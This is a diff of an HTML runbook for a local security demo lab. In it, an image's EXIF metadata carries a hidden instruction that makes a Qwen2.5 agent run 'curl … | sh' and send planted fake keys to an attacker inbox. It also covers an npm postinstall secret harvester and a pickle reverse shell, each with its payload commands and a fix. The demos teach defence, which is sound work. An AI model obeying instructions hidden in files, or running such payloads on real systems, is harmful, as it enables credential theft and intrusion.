@@ -96,7 +96,7 @@
       <li>Apple-Silicon Mac, Docker Desktop running, compose v2.</li>
       <li>Native Ollama up + model pulled:<br><code>ollama list</code> → <code>qwen2.5:7b-instruct</code>.</li>
       <li>Containers reach it at <code>host.docker.internal:11434</code> (composes set <code>host-gateway</code>).</li>
-      <li>No vision model needed (image drop uses OCR).</li>
+      <li>No vision model needed — the payload rides in the file's EXIF metadata, not the pixels.</li>
     </ul>
   </div>
 
@@ -123,18 +123,19 @@
     <h2>DEMO A · Agent hijack — chat + image drop <span class="tag">headline · deterministic</span></h2>
     <ol>
       <li>Open <span class="url">http://localhost:8080</span> (header dot green = model ready).</li>
-      <li>Type “summarize this screenshot”, <b class="hot">drag <code>agent-chat/poisoned_onboarding.png</code></b> onto the box, Send.</li>
-      <li>Watch in order: <code>text extracted from image</code> → <span class="warn">⚠ agent action · run_command</span> → <code>command output: PWNED from the IMAGE as root@…</code> → innocent summary. Red banner fires: <span class="warn">SHELL EXECUTED FROM IMAGE</span>.</li>
+      <li><b class="hot">Warm-up:</b> ask 1–2 normal questions (“which model are you?”, “explain prompt injection in one line”) — it answers from its own weights as <b>Qwen2.5</b>, no tool call. Shows it behaves like a plain assistant.</li>
+      <li>Then type “summarize this screenshot”, <b class="hot">drag <code>agent-chat/poisoned_onboarding.jpg</code></b> onto the box, Send. (It's an ordinary clean screenshot — zoom in, there's nothing to see.)</li>
+      <li>Watch the cards: <code>image pixels (OCR) — clean</code> → <code>📑 file metadata (EXIF) — hidden instruction</code> → <span class="warn">⚠ run_command: curl … | sh</span> → <code>output: exfil sent · 8 secrets</code> → innocent summary → pink callout. <b class="hot">Cut to the attacker inbox</b> <span class="url">http://localhost:9000</span> — the stolen keys just landed.</li>
       <li>Line: “a command sitting in a picture is still a command.” Re-send → identical (temp 0, seed 42).</li>
     </ol>
   </div>
 
   <div class="cell imgup">
-    <h2>A · how the shell works + vision upgrade</h2>
+    <h2>A · how it works + the catch</h2>
     <ul>
-      <li>Server OCRs the PNG (<code>tesseract</code>) → feeds the text to the agent → <code>run_command()</code> runs it <b>server-side in the container</b> (never the host).</li>
-      <li>Default payload = a visible <code>echo PWNED</code>. For a real drop, bake a reverse shell into the image text → it dials <code>demo-listener</code>.</li>
-      <li class="fix">Optional “the model truly SEES it”: on host <code>ollama pull qwen2.5vl:7b</code>, send the image to the vision model. Less deterministic — <b>pre-record</b>, don't run cold.</li>
+      <li>Pixels are <b>clean</b>; the instruction hides in <b>EXIF metadata</b>. The agent runs <code>curl …/stage | sh</code> <b>inside the container</b>: pulls a second-stage harvester from the attacker's box, sweeps the planted secrets (AWS / GitHub / npm / SSH), and <b>beacons them to the collector</b> — the same inbox the npm demo feeds.</li>
+      <li>Realistic by design: fetch-stage-2-then-exfil is how real supply-chain malware works. The inbox <b>appends</b>, so fire it as often as you like.</li>
+      <li class="fix">CATCH: platforms <b>strip EXIF</b> on re-encode — drag the <b>original <code>.jpg</code></b> into the box (the file-drop preserves it); don't route it through a chat app first.</li>
     </ul>
   </div>
 
@@ -146,7 +147,7 @@
       <li>The <code>postinstall</code> hook harvests planted <b>fake</b> secrets (npm token, AWS keys, SSH key, wallet seed, CI env) and beacons them — a card <b class="hot">pops into the inbox live</b>.</li>
       <li>Say: real Shai-Hulud / ethers-provider2 mechanism; here it never leaves Docker.</li>
     </ol>
-    <div class="fix">FIX: <code>docker exec demo-npm-victim npm install --ignore-scripts</code> → inbox stays empty. Re-run: clear <code>node_modules</code> first.</div>
+    <div class="fix">FIX: <code>docker exec demo-npm-victim npm install --ignore-scripts</code> → inbox stays empty. Re-run: clear <code>node_modules</code> + wipe inbox <code>curl localhost:9000/reset</code>.</div>
   </div>
 
   <div class="cell pickle">
@@ -155,7 +156,7 @@
       <li>Watch shells: <code>docker logs -f demo-listener</code></li>
       <li>Make payload (targets the listener):<br><code>docker run --rm --network attacklab -e LISTENER_HOST=demo-listener -v "$PWD/../shell-demos/pickle-rce:/w:ro" -w /w python:3.12-slim python make_payload.py</code></li>
       <li>Send it: <code>curl -s -X POST http://localhost:5001/load --data-urlencode "data=&lt;BASE64&gt;"</code></li>
-      <li>Shell lands as <b class="hot">root</b> in the listener. Interact: <code>docker attach demo-listener</code> (detach <code>Ctrl-P Ctrl-Q</code>).</li>
+      <li>Shell lands as <b class="hot">root</b> on <code>demo-pickle-rce</code>, caught by the listener. Interact: <code>docker attach demo-listener</code> (detach <code>Ctrl-P Ctrl-Q</code>).</li>
     </ol>
     <div class="fix">FIX: switch the app from <code>pickle.loads</code> to <code>json.loads</code> → same POST fails. SAFETY: all listeners/collector are local; nothing leaves the machine; never on a real network. Stall &gt;15s → cut to the 1080p recording.</div>
   </div>
